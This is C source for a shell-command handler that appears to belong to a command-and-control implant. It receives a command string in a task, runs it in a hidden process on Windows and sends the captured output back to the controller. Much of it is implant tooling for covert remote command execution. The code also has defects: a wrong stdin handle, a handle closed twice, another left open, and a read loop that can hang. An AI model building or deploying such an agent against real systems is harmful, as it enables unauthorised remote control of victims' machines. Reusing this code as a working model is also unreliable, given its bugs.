#include <communication.h>
#include <tlv.h>
#include <stdio.h>

void shell_cmd(int taskId, int argc, struct TLVBuild * tlv) {
  if (argc < 1) return;

  struct TLVBuild out;
  out.buf = malloc(50);
  out.allocsize = 50;
  out.bufsize = 0;

  int cmdSize = extractInt32(tlv);
  char * cmd = malloc(cmdSize + 1);

  extractBytes(tlv, cmdSize, cmd);
  cmd[cmdSize] = 0x00;

  printf("[cmd] executing: %s\n", cmd);

  SECURITY_ATTRIBUTES secAttrs = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
  
  HANDLE inRead;
  HANDLE inWrite;
  HANDLE outRead;
  HANDLE outWrite;

  if (!CreatePipe(&inRead, &inWrite, &secAttrs, 0)) {
    printf("err: couldnt create in pipe\n;"); return;
  }
  if (!CreatePipe(&outRead, &outWrite, &secAttrs, 0)) {
    printf("err: couldnt create out pipe\n;"); return;
  }

  STARTUPINFOA startInfo;

  startInfo.cb = sizeof(STARTUPINFOA);
  startInfo.dwFlags = STARTF_USESTDHANDLES;
  startInfo.hStdError = outWrite;
  startInfo.hStdInput = outWrite;

  PROCESS_INFORMATION processInfo;

  if(!CreateProcessA(
    NULL, cmd, &secAttrs, NULL, TRUE, 
    CREATE_NO_WINDOW, NULL, NULL, 
    &startInfo, &processInfo
  )) {
    printf("err: couldnt create process\n;"); return;
  }

  char * outBuffer = malloc(1);
  char * filePart = malloc(1024);
  
  DWORD bufferSize = 0;
  DWORD dwRead = 0;
  
  printf("while loop!\n");
    
  while (ReadFile(outRead, filePart, 1024, &dwRead, NULL)) {
    printf("read: %u bytes\n", dwRead);
    if (dwRead == 0) break;
    outBuffer = realloc(outBuffer, bufferSize + dwRead);
    bufferSize += dwRead;
    memcpy(outBuffer + bufferSize - dwRead, filePart, dwRead);
  }

  printf("finally read: %u bytes\n", bufferSize);

  addBytes(&out, bufferSize, outBuffer);
  send_output(taskId, "output", "", out.bufsize, out.buf);
  
  CloseHandle(inRead);
  CloseHandle(inWrite);
  CloseHandle(inWrite);
  CloseHandle(outWrite);

  free(outBuffer);
  free(filePart);
  free(cmd);
  free(out.buf);
}